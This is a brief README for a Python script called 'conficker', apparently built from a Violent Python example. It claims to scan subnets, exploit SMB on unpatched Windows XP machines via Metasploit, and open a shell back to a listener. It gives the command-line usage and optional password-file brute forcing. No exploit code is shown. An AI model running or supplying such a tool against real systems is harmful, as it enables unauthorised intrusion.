conficker
=========

scan and exploit SMB on unpatched Win XP boxes automatically to spawn shell (scans subnets with CIDR notation)

USAGE:
python conficker.py -H <RHOSTS> -l <LHOST> [-p <LPORT> -F <Password File>]

LPORT and Password File parameters are optional. LPORT defaults to 1337.

CREDITS:
Violent Python - for providing the skeleton even though they teach bad coding practice, and debugging is necessary

REQUIREMENTS:
-python2 nmap module
-nmap
-metasploit